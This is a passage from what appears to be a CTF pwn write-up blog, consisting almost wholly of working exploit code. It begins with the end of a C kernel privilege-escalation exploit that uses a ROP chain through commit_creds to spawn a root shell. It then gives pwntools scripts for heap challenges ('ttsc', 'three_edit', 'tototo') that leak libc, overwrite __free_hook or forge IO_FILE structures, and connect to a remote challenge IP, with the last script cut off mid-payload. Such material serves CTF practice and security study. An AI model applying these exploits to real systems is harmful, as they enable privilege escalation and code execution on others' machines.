class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed to open!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    add(<span class="hljs-number">0</span>);<br>    mov(<span class="hljs-number">0</span>);<br>    del(<span class="hljs-number">0</span>);<br><br>    seq_fd = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(seq_fd &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed to open!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    read(kheap_fd, buf, <span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak_addr_is 0x%lx\n&quot;</span>, buf[<span class="hljs-number">0</span>]);<br>    kernel_offset = buf[<span class="hljs-number">0</span>] - <span class="hljs-number">0xffffffff8133f980</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kernel_offset_is 0x%lx\n&quot;</span>, kernel_offset);<br>    buf[<span class="hljs-number">0</span>] = add_rsp_0x1a8_ret + kernel_offset;<br>    <br>    write(kheap_fd, buf, <span class="hljs-number">8</span>);<br><br>    pop_rdi_ret += kernel_offset;<br>    init_cred += kernel_offset;<br>    commit_creds += kernel_offset;<br>    swapgs_restore_regs_and_return_to_usermode = swapgs_restore_regs_and_return_to_usermode + <span class="hljs-number">10</span> + kernel_offset;<br><br>    __asm__(<br>    <span class="hljs-string">&quot;mov r15,  0;&quot;</span><br>    <span class="hljs-string">&quot;mov r14,  0;&quot;</span><br>    <span class="hljs-string">&quot;mov r13,  pop_rdi_ret;&quot;</span><br>    <span class="hljs-string">&quot;mov r12,  init_cred;&quot;</span><br>    <span class="hljs-string">&quot;mov rbp,  commit_creds;&quot;</span><br>    <span class="hljs-string">&quot;mov rbx,  swapgs_restore_regs_and_return_to_usermode;&quot;</span><br>    <span class="hljs-string">&quot;xor rax,  rax;&quot;</span><br>    <span class="hljs-string">&quot;mov rdx,  8;&quot;</span><br>    <span class="hljs-string">&quot;mov rsi,  rsp;&quot;</span><br>    <span class="hljs-string">&quot;mov rdi,  seq_fd;&quot;</span><br>    <span class="hljs-string">&quot;syscall&quot;</span><br>    );<br><br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ttsc"><a href="#ttsc" class="headerlink" title="ttsc"></a>ttsc</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;ttsc&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./ttsc&#x27;)</span><br><span class="hljs-keyword">global</span> p<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;chs:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.send(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;chs:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;chs:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;name?&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">8</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;age?&#x27;</span>, <span class="hljs-string">b&#x27;111&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;high?&#x27;</span>, <span class="hljs-string">b&#x27;666&#x27;</span>)<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">2</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">3</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x31</span>))<br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">1</span>)<br>    delete(<span class="hljs-number">3</span>)<br>    delete(<span class="hljs-number">2</span>)<br><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>, <span class="hljs-number">8</span>):<br>        add(<span class="hljs-number">0</span>, i * <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>        add(<span class="hljs-number">1</span>, i * <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>        add(<span class="hljs-number">2</span>, i * <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>        add(<span class="hljs-number">3</span>, i * <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>        delete(<span class="hljs-number">3</span>)<br>        delete(<span class="hljs-number">2</span>)<br>        delete(<span class="hljs-number">1</span>)<br>        delete(<span class="hljs-number">0</span>)<br><br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x18</span> + <span class="hljs-string">b&#x27;\x51&#x27;</span><br>    edit(<span class="hljs-number">1</span>, payload)<br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">1</span>)<br><br>    payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">b&#x27;\xf0&#x27;</span> <br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x40</span>, payload)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">2</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">3</span>, <span class="hljs-number">0x20</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x4c1</span>))<br><br>    delete(<span class="hljs-number">1</span>)<br>    delete(<span class="hljs-number">0</span>)<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">1</span>)<br>    delete(<span class="hljs-number">3</span>)<br>    delete(<span class="hljs-number">2</span>)<br><br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;\x60&#x27;</span> + <span class="hljs-string">b&#x27;\x57&#x27;</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">2</span>, <span class="hljs-number">0x50</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">1</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1150</span><br>    libc_base = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br><br>    delete(<span class="hljs-number">0</span>)<br>    payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x31</span>) + p64(free_hook)<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x40</span>, payload)<br>    delete(<span class="hljs-number">0</span>)<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>    add(<span class="hljs-number">3</span>, <span class="hljs-number">0x20</span>, p64(sys_addr))<br>    delete(<span class="hljs-number">0</span>)<br>    p.interactive()<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#p = process(&#x27;./ttsc&#x27;)</span><br>        p = remote(<span class="hljs-string">&#x27;121.40.89.206&#x27;</span>, <span class="hljs-number">20111</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure><h1 id="three-edit"><a href="#three-edit" class="headerlink" title="three_edit"></a>three_edit</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn4&#x27;</span>)<br><span class="hljs-comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span><br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./pwn4&#x27;, aslr=False)</span><br><span class="hljs-keyword">global</span> p<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;content:&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    add(<span class="hljs-number">2</span>, <span class="hljs-number">0x50</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + p64(<span class="hljs-number">0x61</span>))<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    delete(<span class="hljs-number">2</span>)<br>    delete(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>        add(i, <span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    delete(<span class="hljs-number">4</span>)<br>    delete(<span class="hljs-number">3</span>)<br>    delete(<span class="hljs-number">2</span>)<br>    delete(<span class="hljs-number">1</span>)<br>    edit(-<span class="hljs-number">62</span>, <span class="hljs-string">b&#x27;\x40&#x27;</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    add(<span class="hljs-number">2</span>, <span class="hljs-number">0x50</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0x461</span>))<br>    delete(<span class="hljs-number">0</span>)<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;&#x27;</span>)<br>    <br>    add(<span class="hljs-number">3</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;&#x27;</span>)<br>    edit(-<span class="hljs-number">60</span>, <span class="hljs-string">b&#x27;\xa0&#x27;</span> + <span class="hljs-string">b&#x27;\x86&#x27;</span>)<br>    add(<span class="hljs-number">4</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    edit(-<span class="hljs-number">60</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    <span class="hljs-comment">#p.recvuntil(b&#x27;\x7f&#x27;, timeout=1)</span><br>    leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">1</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) + <span class="hljs-number">0xd20</span><br>    libc_base = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>    <span class="hljs-keyword">if</span> libc_base &lt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span><br>    <br>    sleep(<span class="hljs-number">4</span>)<br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">1</span>)<br>    edit(-<span class="hljs-number">62</span>, p64(free_hook))<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>, p64(sys_addr))<br>    delete(<span class="hljs-number">0</span>)<br>    p.interactive()<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br><span class="hljs-comment">#p = process(&#x27;./pwn4&#x27;)</span><br><span class="hljs-comment">#pwn()</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#p = process(&#x27;./pwn4&#x27;)</span><br>        p = remote(<span class="hljs-string">&#x27;121.40.89.206&#x27;</span>, <span class="hljs-number">21795</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure><h1 id="tototo"><a href="#tototo" class="headerlink" title="tototo"></a>tototo</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;./tototo&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.31.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./tototo&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;121.40.89.206&#x27;</span>, <span class="hljs-number">36789</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size?&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;one?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;one?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;content?&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;one?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cadd</span>(<span class="hljs-params">index, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size?&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br>cadd(<span class="hljs-number">0</span>, <span class="hljs-number">0x200</span>)<br>cadd(<span class="hljs-number">1</span>, <span class="hljs-number">0x420</span>)<br>cadd(<span class="hljs-number">2</span>, <span class="hljs-number">0x200</span>)<br>cadd(<span class="hljs-number">3</span>, <span class="hljs-number">0x410</span>)<br>cadd(<span class="hljs-number">4</span>, <span class="hljs-number">0x200</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x2a0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_addr))<br><br>delete(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span><br>libc_base = leak - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>mprotect = libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>IO_wfile_jumps = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>pop_rdi_ret = libc_base + <span class="hljs-number">0x26b72</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x27529</span><br>pop_rdx_r12_ret = libc_base + <span class="hljs-number">0x11c371</span><br>ret = pop_rdi_ret + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br>cadd(<span class="hljs-number">5</span>, <span class="hljs-number">0x430</span>)<br>delete(<span class="hljs-number">3</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">7</span> + p64(<span class="hljs-number">0</span>) + p64(IO_list_all - <span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">1</span>, payload)<br>cadd(<span class="hljs-number">6</span>, <span class="hljs-number">0x430</span>)<br><br>fake_addr = heap_addr + <span class="hljs-number">0xae0</span><br>fake_IO_FILE = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">7</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x58</span><br>fake_IO_FILE += p64(heap_addr)             <span class="hljs-comment">#_lock</span><br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x10</span><br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x30</span><br>fake_IO_FILE += p64(IO_wfile_jumps)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x68</span><br>fake_IO_FILE += p64(setcontext + <span class="hljs-number">61</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x30</span><br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0x200</span>)<br>fake_IO_FILE += p64(ret)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span 